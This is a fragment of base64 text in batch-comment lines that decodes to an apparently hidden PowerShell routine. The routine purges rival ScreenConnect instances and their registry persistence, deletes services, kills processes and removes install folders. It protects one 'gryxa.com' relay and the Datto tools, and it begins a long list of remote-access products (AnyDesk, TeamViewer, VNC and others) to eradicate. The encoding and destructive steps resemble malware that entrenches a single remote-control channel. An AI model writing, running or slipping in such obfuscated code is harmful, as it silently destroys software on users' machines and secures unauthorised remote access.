::ICAgICAgICAgICAgICdIS0xNOlxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xD
::dXJyZW50VmVyc2lvblxSdW5PbmNlJywNCiAgICAgICAgICAgICAgICAgICAgICAg
::ICAgJ0hLTE06XFNPRlRXQVJFXFdPVzY0MzJOb2RlXE1pY3Jvc29mdFxXaW5kb3dz
::XEN1cnJlbnRWZXJzaW9uXFJ1bicsDQogICAgICAgICAgICAgICAgICAgICAgICAg
::ICdIS0xNOlxTT0ZUV0FSRVxXT1c2NDMyTm9kZVxNaWNyb3NvZnRcV2luZG93c1xD
::dXJyZW50VmVyc2lvblxSdW5PbmNlJywNCiAgICAgICAgICAgICAgICAgICAgICAg
::ICAgJ0hLQ1U6XFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJz
::aW9uXFJ1bicsDQogICAgICAgICAgICAgICAgICAgICAgICAgICdIS0NVOlxTT0ZU
::V0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW5PbmNlJykp
::IHsNCiAgICAgICAgICAgIGlmICgtbm90IChUZXN0LVBhdGggJHJrKSkgeyBjb250
::aW51ZSB9DQogICAgICAgICAgICAkcCA9IEdldC1JdGVtUHJvcGVydHkgJHJrIC1F
::cnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgICAgICAgICBpZiAoLW5v
::dCAkcCkgeyBjb250aW51ZSB9DQogICAgICAgICAgICBmb3JlYWNoICgkcHJvcCBp
::biAkcC5QU09iamVjdC5Qcm9wZXJ0aWVzKSB7DQogICAgICAgICAgICAgICAgaWYg
::KCRwcm9wLk5hbWUgLWxpa2UgJ1BTKicpIHsgY29udGludWUgfQ0KICAgICAgICAg
::ICAgICAgICR2ID0gW3N0cmluZ10kcHJvcC5WYWx1ZQ0KICAgICAgICAgICAgICAg
::IGlmIChUZXN0LVNjS2VlcGVyUmVmICR2KSB7IGNvbnRpbnVlIH0NCiAgICAgICAg
::ICAgICAgICBpZiAoJHYgLW5vdG1hdGNoICcoP2kpU2NyZWVuQ29ubmVjdHxtc2ll
::eGVjJykgeyBjb250aW51ZSB9DQogICAgICAgICAgICAgICAgJGhpdCA9ICRmYWxz
::ZQ0KICAgICAgICAgICAgICAgIGlmICgkRnAgLWFuZCAkdiAtbWF0Y2ggW3JlZ2V4
::XTo6RXNjYXBlKCRGcCkpIHsgJGhpdCA9ICR0cnVlIH0NCiAgICAgICAgICAgICAg
::ICBlbHNlaWYgKCR2IC1tYXRjaCAnKD9pKVNjcmVlbkNvbm5lY3RcLkNsaWVudFNl
::dHVwfFNjcmVlbkNvbm5lY3QgQ2xpZW50JykgeyAkaGl0ID0gJHRydWUgfQ0KICAg
::ICAgICAgICAgICAgIGlmICgkaGl0KSB7DQogICAgICAgICAgICAgICAgICAgIFJl
::bW92ZS1JdGVtUHJvcGVydHkgLVBhdGggJHJrIC1OYW1lICRwcm9wLk5hbWUgLUZv
::cmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgICAgICAgICAg
::ICAgICAgIExvZyAicGVyc2lzdF9ydW5rZXlfcmVtb3ZlZCAkcmtcJCgkcHJvcC5O
::YW1lKSBmcD0kRnAiDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0K
::ICAgICAgICB9DQogICAgfQ0KDQogICAgTG9nICdleHRlcm1pbmF0ZV9lbmdpbmVf
::TDdfYmVnaW4nDQoNCiAgICAjIHB1cmdlIHBlcnNpc3RlbmNlIGZvciBldmVyeSBu
::b24ta2VlcGVyIFNDIGZpbmdlcnByaW50IEJFRk9SRSBwcm9kdWN0L3N2Yy9kaXIg
::cmVtb3ZhbCwNCiAgICAjIHNvIGFuIG9sZC9mb3JlaWduIFNDIHdhdGNoZG9nIGNh
::bm5vdCByZWluc3RhbGwgaXRzZWxmIChhbmQgY3Jvc3Mta2lsbCBHcnl4YSkgbWlk
::LXBhc3MuDQogICAgZm9yZWFjaCAoJGZwWCBpbiAoR2V0LU5vbktlZXBlclNjRnBz
::KSkgew0KICAgICAgICBSZW1vdmUtU2NQZXJzaXN0ZW5jZSAkZnBYDQogICAgfQ0K
::DQogICAgIyAxLiBmb3JlaWduIFNDIHByb2R1Y3RzIGZyb20gQk9USCBjb3JyZWN0
::IEFSUCBoaXZlcw0KICAgICRzZWVuID0gQHt9DQogICAgZm9yZWFjaCAoJHJvb3Qg
::aW4gJHNjcmlwdDpVbmluc3RhbGxSb290cykgew0KICAgICAgICBpZiAoLW5vdCAo
::VGVzdC1QYXRoICRyb290KSkgeyBMb2cgImhpdmVfbWlzc2luZyAkcm9vdCI7IGNv
::bnRpbnVlIH0NCiAgICAgICAgTG9nICJoaXZlX3NjYW4gJHJvb3QiDQogICAgICAg
::IEdldC1DaGlsZEl0ZW0gJHJvb3QgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGlu
::dWUgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICAgICAkcHJvcCA9IEdldC1J
::dGVtUHJvcGVydHkgJF8uUFNQYXRoIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRp
::bnVlDQogICAgICAgICAgICAkZG4gPSAkcHJvcC5EaXNwbGF5TmFtZQ0KICAgICAg
::ICAgICAgaWYgKC1ub3QgJGRuKSB7IHJldHVybiB9DQogICAgICAgICAgICBpZiAo
::JGRuIC1ub3RtYXRjaCAnKD9pKVNjcmVlbkNvbm5lY3RccytDbGllbnRccypcKChb
::MC05QS1GYS1mXXsxNn0pXCknKSB7IHJldHVybiB9DQogICAgICAgICAgICAkZnAg
::PSAkTWF0Y2hlc1sxXS5Ub0xvd2VyKCkNCiAgICAgICAgICAgIGlmICgkZnAgLWlu
::ICRrZWVwKSB7IHJldHVybiB9DQogICAgICAgICAgICAkdXMgPSAkcHJvcC5Vbmlu
::c3RhbGxTdHJpbmcNCiAgICAgICAgICAgIGlmICgkdXMgLWFuZCAkdXMgLW1hdGNo
::ICcoP2kpZ3J5eGFcLmNvbScpIHsgTG9nICJwcm9kdWN0X3NraXBfZ3J5eGFfcmVs
::YXkgWyRkbl0iOyByZXR1cm4gfQ0KICAgICAgICAgICAgaWYgKCRzZWVuLkNvbnRh
::aW5zS2V5KCRfLlBTQ2hpbGROYW1lKSkgeyByZXR1cm4gfQ0KICAgICAgICAgICAg
::JHNlZW5bJF8uUFNDaGlsZE5hbWVdID0gJHRydWUNCiAgICAgICAgICAgIGlmIChV
::bmluc3RhbGwtUHJvZHVjdEtleSAkXykgeyAkbi5wcm9kdWN0KysgfSBlbHNlIHsg
::JG4uZmFpbCsrOyBMb2cgInByb2R1Y3RfUkVNT1ZFX0ZBSUxFRCBbJGRuXSIgfQ0K
::ICAgICAgICB9DQogICAgfQ0KDQogICAgIyAyLiBmb3JlaWduIFNDIHNlcnZpY2Vz
::IChza2lwIGlmIGtlZXBlciBGUCBvciByZWxheSBpcyBncnl4YS5jb20pDQogICAg
::Zm9yZWFjaCAoJHN2YyBpbiAoR2V0LVNlcnZpY2UgLUVycm9yQWN0aW9uIFNpbGVu
::dGx5Q29udGludWUgfCBXaGVyZS1PYmplY3QgeyAkXy5OYW1lIC1saWtlICdTY3Jl
::ZW5Db25uZWN0IENsaWVudConIH0pKSB7DQogICAgICAgIGlmIChJcy1LZWVwZXIg
::JHN2Yy5OYW1lKSB7IGNvbnRpbnVlIH0NCiAgICAgICAgJGltZyA9IChHZXQtSXRl
::bVByb3BlcnR5ICJIS0xNOlxTWVNURU1cQ3VycmVudENvbnRyb2xTZXRcU2Vydmlj
::ZXNcJCgkc3ZjLk5hbWUpIiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSku
::SW1hZ2VQYXRoDQogICAgICAgIGlmIChJcy1LZWVwZXIgJGltZykgeyBMb2cgInN2
::Y19za2lwX2dyeXhhX3JlbGF5ICQoJHN2Yy5OYW1lKSI7IGNvbnRpbnVlIH0NCiAg
::ICAgICAgJiBzYy5leGUgc3RvcCAiJCgkc3ZjLk5hbWUpIiAyPiYxIHwgT3V0LU51
::bGwNCiAgICAgICAgU3RhcnQtU2xlZXAgLU1pbGxpc2Vjb25kcyA2MDANCiAgICAg
::ICAgJiBzYy5leGUgZGVsZXRlICIkKCRzdmMuTmFtZSkiIDI+JjEgfCBPdXQtTnVs
::bA0KICAgICAgICAkbi5zdmMrKzsgTG9nICJzdmNfZGVsZXRlZCAkKCRzdmMuTmFt
::ZSkiDQogICAgfQ0KDQogICAgIyAzLiBmb3JlaWduIFNDIHByb2Nlc3NlcyDigJQg
::T05MWSBpZiBwYXRoL2NtZGxpbmUgZW1iZWRzIGEgTk9OLWtlZXBlciBGUC4NCiAg
::ICAjIE80MTogbnVsbCBFeGVjdXRhYmxlUGF0aCB1c2VkIHRvIGtpbGwgR3J5eGEg
::Q2xpZW50U2VydmljZSBldmVyeSB0aWNrIOKGkiByZWluc3RhbGwgbG9vcC4NCiAg
::ICBHZXQtQ2ltSW5zdGFuY2UgV2luMzJfUHJvY2VzcyAtRmlsdGVyICJOYW1lIGxp
::a2UgJ1NjcmVlbkNvbm5lY3QlJyIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGlu
::dWUgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICRleGUgPSBbc3RyaW5nXSRf
::LkV4ZWN1dGFibGVQYXRoDQogICAgICAgICRjbWQgPSBbc3RyaW5nXSRfLkNvbW1h
::bmRMaW5lDQogICAgICAgICRibG9iID0gIiRleGUgJGNtZCINCiAgICAgICAgaWYg
::KElzLUtlZXBlciAkYmxvYikgeyByZXR1cm4gfQ0KICAgICAgICBpZiAoJGJsb2Ig
::LW1hdGNoICcoP2kpZ3J5eGFcLmNvbScpIHsgTG9nICJwcm9jX3NraXBfZ3J5eGFf
::cmVsYXkgcGlkPSQoJF8uUHJvY2Vzc0lkKSI7IHJldHVybiB9DQogICAgICAgIGlm
::ICgkYmxvYiAtbm90bWF0Y2ggJ1woKFswLTlhLWZBLUZdezE2fSlcKScpIHsNCiAg
::ICAgICAgICAgIExvZyAicHJvY19za2lwX25vX2ZwIHBpZD0kKCRfLlByb2Nlc3NJ
::ZCkgbmFtZT0kKCRfLk5hbWUpIg0KICAgICAgICAgICAgcmV0dXJuDQogICAgICAg
::IH0NCiAgICAgICAgJGZwID0gJE1hdGNoZXNbMV0uVG9Mb3dlcigpDQogICAgICAg
::IGlmICgkZnAgLWluICRrZWVwKSB7IHJldHVybiB9DQogICAgICAgIFN0b3AtUHJv
::Y2VzcyAtSWQgJF8uUHJvY2Vzc0lkIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50
::bHlDb250aW51ZQ0KICAgICAgICAkbi5wcm9jKys7IExvZyAicHJvY19raWxsZWQg
::cGlkPSQoJF8uUHJvY2Vzc0lkKSBmcD0kZnAgZXhlPSRleGUiDQogICAgfQ0KDQog
::ICAgIyA0LiBmb3JlaWduIFNDIGluc3RhbGwgZGlycyAoUEYgKyBQRjg2KQ0KICAg
::IGZvcmVhY2ggKCRiYXNlIGluIEAoJGVudjpQcm9ncmFtRmlsZXMsICR7ZW52OlBy
::b2dyYW1GaWxlcyh4ODYpfSkpIHsNCiAgICAgICAgaWYgKC1ub3QgJGJhc2UgLW9y
::IC1ub3QgKFRlc3QtUGF0aCAkYmFzZSkpIHsgY29udGludWUgfQ0KICAgICAgICBH
::ZXQtQ2hpbGRJdGVtIC1MaXRlcmFsUGF0aCAkYmFzZSAtRGlyZWN0b3J5IC1Gb3Jj
::ZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8DQogICAgICAgICAgICBX
::aGVyZS1PYmplY3QgeyAkXy5OYW1lIC1saWtlICdTY3JlZW5Db25uZWN0KicgfSB8
::IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgICAgICAgICAkZCA9ICRfLkZ1bGxO
::YW1lDQogICAgICAgICAgICAgICAgaWYgKElzLUtlZXBlciAkZCkgeyByZXR1cm4g
::fQ0KICAgICAgICAgICAgICAgICMgZGlyIGNhcnJpZXMgbm8gRlAvcmVsYXkgaW4g
::aXRzIG5hbWU7IHByb3RlY3QgdGhlIG9uZSBiYWNraW5nIGEga2VlcGVyL2dyeXhh
::IHNlcnZpY2UNCiAgICAgICAgICAgICAgICAkbGVhZiA9ICRfLk5hbWUNCiAgICAg
::ICAgICAgICAgICAkc3ZjSGVyZSA9IEdldC1TZXJ2aWNlIC1FcnJvckFjdGlvbiBT
::aWxlbnRseUNvbnRpbnVlIHwgV2hlcmUtT2JqZWN0IHsgJF8uTmFtZSAtbGlrZSAn
::U2NyZWVuQ29ubmVjdCBDbGllbnQqJyB9IHwgV2hlcmUtT2JqZWN0IHsNCiAgICAg
::ICAgICAgICAgICAgICAgJGltID0gKEdldC1JdGVtUHJvcGVydHkgIkhLTE06XFNZ
::U1RFTVxDdXJyZW50Q29udHJvbFNldFxTZXJ2aWNlc1wkKCRfLk5hbWUpIiAtRXJy
::b3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSkuSW1hZ2VQYXRoDQogICAgICAgICAg
::ICAgICAgICAgICRpbSAtYW5kICgkaW0gLWxpa2UgIiokbGVhZioiKQ0KICAgICAg
::ICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBpZiAoJHN2Y0hlcmUpIHsgTG9n
::ICJkaXJfc2tpcF9saXZlX3N2YyAkZCI7IHJldHVybiB9DQogICAgICAgICAgICAg
::ICAgaWYgKEZvcmNlLVJlbW92ZURpciAkZCkgeyAkbi5kaXIrKzsgTG9nICJkaXJf
::cmVtb3ZlZCAkZCIgfQ0KICAgICAgICAgICAgICAgIGVsc2UgeyAkbi5mYWlsKys7
::IExvZyAiZGlyX1JFTU9WRV9GQUlMRUQgJGQiIH0NCiAgICAgICAgICAgIH0NCiAg
::ICB9DQoNCiAgICAjIDUuIGRpc2FsbG93ZWQgUk1NIC8gcmVtb3RlLWFjY2VzcyB0
::b29scyAobWFya2V0IGNvdmVyYWdlIDIwMjYpLg0KICAgICMgS0VFUCBmb3JldmVy
::OiBEYXR0by9DZW50cmFTdGFnZSArIFNjcmVlbkNvbm5lY3Qga2VlcCBGUHMgKGhh
::bmRsZWQgYWJvdmUpLg0KICAgICMgTkVWRVIgcHV0IERhdHRvL0NlbnRyYVN0YWdl
::L0NhZ1NlcnZpY2UgaW4gdGhpcyBsaXN0Lg0KICAgIGZ1bmN0aW9uIElzLURhdHRv
::S2VlcGVyKFtzdHJpbmddJHMpIHsNCiAgICAgICAgaWYgKC1ub3QgJHMpIHsgcmV0
::dXJuICRmYWxzZSB9DQogICAgICAgIHJldHVybiBbYm9vbF0oJHMgLW1hdGNoICco
::P2kpRGF0dG98Q2VudHJhU3RhZ2V8Q2FnU2VydmljZXxBdXRvdGFza0VuZHBvaW50
::JykNCiAgICB9DQogICAgJHJtbSA9IEAoDQogICAgICAgIEB7IFRhZz0nQW55RGVz
::ayc7ICAgICAgU3ZjPUAoJ0FueURlc2snKTsgUHJvYz1AKCdBbnlEZXNrJyk7IERp
::cnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcQW55RGVzayIsIiR7ZW52OlByb2dyYW1G
::aWxlcyh4ODYpfVxBbnlEZXNrIiwiJGVudjpQcm9ncmFtRGF0YVxBbnlEZXNrIik7
::IFByb2Q9QCgnQW55RGVzayonKSB9DQogICAgICAgIEB7IFRhZz0nVGVhbVZpZXdl
::cic7ICAgU3ZjPUAoJ1RlYW1WaWV3ZXIqJyk7IFByb2M9QCgnVGVhbVZpZXdlcion
::LCd0dl93MzIqJywndHZfeDY0KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVz
::XFRlYW1WaWV3ZXIiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cVGVhbVZpZXdl
::ciIpOyBQcm9kPUAoJ1RlYW1WaWV3ZXIqJykgfQ0KICAgICAgICBAeyBUYWc9J1Nw
::bGFzaHRvcCc7ICAgIFN2Yz1AKCdTcGxhc2h0b3AqJywnU1JTZXJ2aWNlJywnU1NV
::U2VydmljZScpOyBQcm9jPUAoJ1NwbGFzaHRvcConLCdzdHJ3aW5jbHQqJywnU1JN
::YW5hZ2VyKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFNwbGFzaHRvcCIs
::IiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxTcGxhc2h0b3AiKTsgUHJvZD1AKCdT
::cGxhc2h0b3AqJykgfQ0KICAgICAgICBAeyBUYWc9J0xvZ01lSW4nOyAgICAgIFN2
::Yz1AKCdMb2dNZUluJywnTE1JR3VhcmRpYW5TdmMnLCdMTUlpZ25pdGlvbicpOyBQ
::cm9jPUAoJ0xvZ01lSW4qJywnTE1JR3VhcmRpYW4qJywnUmFTZXJ2ZXIqJyk7IERp
::cnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcTG9nTWVJbiIsIiR7ZW52OlByb2dyYW1G
::aWxlcyh4ODYpfVxMb2dNZUluIik7IFByb2Q9QCgnTG9nTWVJbionKSB9DQogICAg
::ICAgIEB7IFRhZz0nR29Ubyc7ICAgICAgICAgU3ZjPUAoJ0dvVG9NeVBDKicsJ0dv
::VG9Bc3Npc3QqJywnR29Ub1Jlc29sdmUqJyk7IFByb2M9QCgnR29Ub015UEMqJywn
::R29Ub0Fzc2lzdConLCdnMm0qJywnR29Ub1Jlc29sdmUqJyk7IERpcnM9QCgiJGVu
::djpQcm9ncmFtRmlsZXNcR29Ub015UEMiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2
::KX1cR29Ub015UEMiKTsgUHJvZD1AKCdHb1RvTXlQQyonLCdHb1RvQXNzaXN0Kics
::J0dvVG8gUmVzb2x2ZSonLCdHb1RvTWVldGluZyonLCdHb1RvIENvbm5lY3QqJykg
::fQ0KICAgICAgICBAeyBUYWc9J1J1c3REZXNrJzsgICAgIFN2Yz1AKCdSdXN0RGVz
::aycsJ3J1c3RkZXNrKicpOyBQcm9jPUAoJ3J1c3RkZXNrKicpOyBEaXJzPUAoIiRl
::bnY6UHJvZ3JhbUZpbGVzXFJ1c3REZXNrIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4
::Nil9XFJ1c3REZXNrIik7IFByb2Q9QCgnUnVzdERlc2sqJykgfQ0KICAgICAgICBA
::eyBUYWc9J1N1cHJlbW8nOyAgICAgIFN2Yz1AKCdTdXByZW1vKicpOyBQcm9jPUAo
::J1N1cHJlbW8qJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcU3VwcmVtbyIs
::IiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxTdXByZW1vIik7IFByb2Q9QCgnU3Vw
::cmVtbyonKSB9DQogICAgICAgIEB7IFRhZz0nRFdTZXJ2aWNlJzsgICAgU3ZjPUAo
::J0RXQWdlbnQnLCdkd2FnZW50KicpOyBQcm9jPUAoJ2R3YWdlbnQqJyk7IERpcnM9
::QCgiJGVudjpQcm9ncmFtRmlsZXNcRFdBZ2VudCIsIiR7ZW52OlByb2dyYW1GaWxl
::cyh4ODYpfVxEV0FnZW50IiwiJGVudjpQcm9ncmFtRGF0YVxEV0FnZW50Iik7IFBy
::b2Q9QCgnRFdBZ2VudConLCdEV1NlcnZpY2UqJykgfQ0KICAgICAgICBAeyBUYWc9
::J1pvaG9Bc3Npc3QnOyAgIFN2Yz1AKCdab2hvQXNzaXN0KicsJ1pvaG9NZWV0aW5n
::KicpOyBQcm9jPUAoJ1pvaG9Bc3Npc3QqJywnWm9ob1VSU0IqJyk7IERpcnM9QCgi
::JGVudjpQcm9ncmFtRmlsZXNcWm9ob01lZXRpbmciLCIke2VudjpQcm9ncmFtRmls
::ZXMoeDg2KX1cWm9ob01lZXRpbmciKTsgUHJvZD1AKCdab2hvIEFzc2lzdConLCda
::b2hvTWVldGluZyonKSB9DQogICAgICAgIEB7IFRhZz0nUmVtb3RlUEMnOyAgICAg
::U3ZjPUAoJ1JlbW90ZVBDKicpOyBQcm9jPUAoJ1JlbW90ZVBDKicsJ1JQQ1N1aXRl
::KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFJlbW90ZVBDIiwiJHtlbnY6
::UHJvZ3JhbUZpbGVzKHg4Nil9XFJlbW90ZVBDIik7IFByb2Q9QCgnUmVtb3RlUEMq
::JykgfQ0KICAgICAgICBAeyBUYWc9J0JvbWdhcic7ICAgICAgIFN2Yz1AKCdib21n
::YXIqJywnQmV5b25kVHJ1c3QqJyk7IFByb2M9QCgnYm9tZ2FyKicpOyBEaXJzPUAo
::IiRlbnY6UHJvZ3JhbUZpbGVzXEJvbWdhciIsIiR7ZW52OlByb2dyYW1GaWxlcyh4
::ODYpfVxCb21nYXIiLCIkZW52OlByb2dyYW1GaWxlc1xCZXlvbmRUcnVzdCIsIiR7
::ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxCZXlvbmRUcnVzdCIpOyBQcm9kPUAoJ0Jv
::bWdhcionLCdCZXlvbmRUcnVzdConKSB9DQogICAgICAgIEB7IFRhZz0nUGFyc2Vj
::JzsgICAgICAgU3ZjPUAoJ1BhcnNlYyonKTsgUHJvYz1AKCdwYXJzZWNkKicsJ3Bz
::ZXJ2aWNlKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFBhcnNlYyIsIiR7
::ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxQYXJzZWMiLCIkZW52OlByb2dyYW1EYXRh
::XFBhcnNlYyIpOyBQcm9kPUAoJ1BhcnNlYyonKSB9DQogICAgICAgIEB7IFRhZz0n
::Q2hyb21lUkQnOyAgICAgU3ZjPUAoJ2Nocm9tb3RpbmcqJyk7IFByb2M9QCgncmVt
::b3RpbmdfaG9zdConKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xHb29nbGVc
::Q2hyb21lIFJlbW90ZSBEZXNrdG9wIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9
::XEdvb2dsZVxDaHJvbWUgUmVtb3RlIERlc2t0b3AiKTsgUHJvZD1AKCdDaHJvbWUg
::UmVtb3RlIERlc2t0b3AqJykgfQ0KICAgICAgICBAeyBUYWc9J1VsdHJhVk5DJzsg
::ICAgIFN2Yz1AKCd1dm5jKicsJ3dpbnZuYyonKTsgUHJvYz1AKCd3aW52bmMqJywn
::dXZuYyonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xVbHRyYVZOQyIsIiR7
::ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxVbHRyYVZOQyIpOyBQcm9kPUAoJ1VsdHJh
::Vk5DKicsJ1dpblZOQyonKSB9DQogICAgICAgIEB7IFRhZz0nVGlnaHRWTkMnOyAg
::ICAgU3ZjPUAoJ3R2bnNlcnZlcionKTsgUHJvYz1AKCd0dm5zZXJ2ZXIqJywndHZu
::dmlld2VyKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFRpZ2h0Vk5DIiwi
::JHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFRpZ2h0Vk5DIik7IFByb2Q9QCgnVGln
::aHRWTkMqJykgfQ0KICAgICAgICBAeyBUYWc9J1JlYWxWTkMnOyAgICAgIFN2Yz1A
::KCd2bmNzZXJ2ZXIqJyk7IFByb2M9QCgndm5jc2VydmVyKicsJ3ZuY3ZpZXdlcion
::KTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xSZWFsVk5DIiwiJHtlbnY6UHJv
::Z3JhbUZpbGVzKHg4Nil9XFJlYWxWTkMiKTsgUHJvZD1AKCdWTkMgU2VydmVyKics
::J1JlYWxWTkMqJykgfQ0KICAgICAgICBAeyBUYWc9J0RhbWVXYXJlJzsgICAgIFN2
::Yz1AKCdEYW1lV2FyZSonKTsgUHJvYz1AKCdEV1JDUyonLCdEV1JDQyonLCdEYW1l
::V2FyZSonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xTb2xhcldpbmRzIiwi
::JHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFNvbGFyV2luZHMiLCIkZW52OlByb2dy
::YW1GaWxlc1xEYW1lV2FyZSBSZW1vdGUgU3VwcG9ydCIsIiR7ZW52OlByb2dyYW1G
::aWxlcyh4ODYpfVxEYW1lV2FyZSBSZW1vdGUgU3VwcG9ydCIpOyBQcm9kPUAoJ0Rh
::bWVXYXJlKicpIH0NCiAgICAgICAgQHsgVGFnPSdOZXRTdXBwb3J0JzsgICBTdmM9
::QCgnTmV0U3VwcG9ydConKTsgUHJvYz1AKCdjbGllbnQzMionLCdwY2ljdGwqJyk7
::IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcTmV0U3VwcG9ydCIsIiR7ZW52OlBy
::b2dyYW1GaWxlcyh4ODYpfVxOZXRTdXBwb3J0Iik7IFByb2Q9QCgnTmV0U3VwcG9y
::dConKSB9DQogICAgICAgIEB7IFRhZz0nU2ltcGxlSGVscCc7ICAgU3ZjPUAoJ1Np
::bXBsZUhlbHAqJyk7IFByb2M9QCgnU2ltcGxlU2VydmljZSonLCdzaW1wbGVzZXJ2
::aWNlKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFNpbXBsZUhlbHAiLCIk
::e2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cU2ltcGxlSGVscCIpOyBQcm9kPUAoJ1Np
::bXBsZUhlbHAqJykgfQ0KICAgICAgICBAeyBUYWc9J0dldFNjcmVlbic7ICAgIFN2
::Yz1AKCdHZXRTY3JlZW4qJyk7IFByb2M9QCgnR2V0U2NyZWVuKicpOyBEaXJzPUAo
::IiRlbnY6UHJvZ3JhbUZpbGVzXEdldFNjcmVlbiIsIiR7ZW52OlByb2dyYW1GaWxl
::cyh4ODYpfVxHZXRTY3JlZW4iKTsgUHJvZD1AKCdHZXRTY3JlZW4qJykgfQ0KICAg
::ICAgICBAeyBUYWc9J0lwZXJpdXMnOyAgICAgIFN2Yz1AKCdJcGVyaXVzKicpOyBQ
::cm9jPUAoJ0lwZXJpdXNSZW1vdGUqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmls
::ZXNcSXBlcml1cyBSZW1vdGUiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cSXBl
::cml1cyBSZW1vdGUiKTsgUHJvZD1AKCdJcGVyaXVzKicpIH0NCiAgICAgICAgQHsg
::VGFnPSdJU0xPbmxpbmUnOyAgIFN2Yz1AKCdJU0xsaWdodConKTsgUHJvYz1AKCdJ
::U0xsaWdodConLCdJU0xBbHdheXNPbionKTsgRGlycz1AKCIkZW52OlByb2dyYW1G
::aWxlc1xJU0wgT25saW5lIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XElTTCBP
::bmxpbmUiKTsgUHJvZD1AKCdJU0wgTGlnaHQqJywnSVNMIEFsd2F5c09uKicpIH0N
::CiAgICAgICAgQHsgVGFnPSdBbW15eSc7ICAgICAgICBTdmM9QCgnQW1teXkqJyk7
::IFByb2M9QCgnQW1teXkqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcQW1t
::eXkiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cQW1teXkiKTsgUHJvZD1AKCdB
::bW15eSonKSB9DQogICAgICAgIEB7IFRhZz0nVWx0cmFWaWV3ZXInOyAgU3ZjPUAo
::J1VsdHJhVmlld2VyKicpOyBQcm9jPUAoJ1VsdHJhVmlld2VyKicpOyBEaXJzPUAo
::IiRlbnY6UHJvZ3JhbUZpbGVzXFVsdHJhVmlld2VyIiwiJHtlbnY6UHJvZ3JhbUZp
::bGVzKHg4Nil9XFVsdHJhVmlld2VyIik7IFByb2Q9QCgnVWx0cmFWaWV3ZXIqJykg
::fQ0KICAgICAgICBAeyBUYWc9J0Flcm9BZG1pbic7ICAgIFN2Yz1AKCdBZXJvQWRt
::aW4qJyk7IFByb2M9QCgnQWVyb0FkbWluKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3Jh
::bUZpbGVzXEFlcm9BZG1pbiIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxBZXJv
::QWRtaW4iKTsgUHJvZD1AKCdBZXJvQWRtaW4qJykgfQ0KICAgICAgICBAeyBUYWc9
::J0xpdGVNYW5hZ2VyJzsgIFN2Yz1AKCdMaXRlTWFuYWdlcionKTsgUHJvYz1AKCdS
::T01TZXJ2ZXIqJywnUk9NVmlld2VyKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZp
::bGVzXExpdGVNYW5hZ2VyIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XExpdGVN
::YW5hZ2VyIik7IFByb2Q9QCgnTGl0ZU1hbmFnZXIqJykgfQ0KICAgICAgICBAeyBU
::YWc9J1JhZG1pbic7ICAgICAgIFN2Yz1AKCdSYWRtaW4qJyk7IFByb2M9QCgncnNl
::cnZlcjMqJywnUmFkbWluKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFJh
::ZG1pbiBTZXJ2ZXIgMyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxSYWRtaW4g
::U2VydmVyIDMiKTsgUHJvZD1AKCdSYWRtaW4qJykgfQ0KICAgICAgICBAeyBUYWc9
::J05vTWFjaGluZSc7ICAgIFN2Yz1AKCdueHNlcnZlcionLCdueGQqJyk7IFByb2M9
::QCgnbnhkKicsJ254c2VydmVyKicsJ254cnVubmVyKicpOyBEaXJzPUAoIiRlbnY6
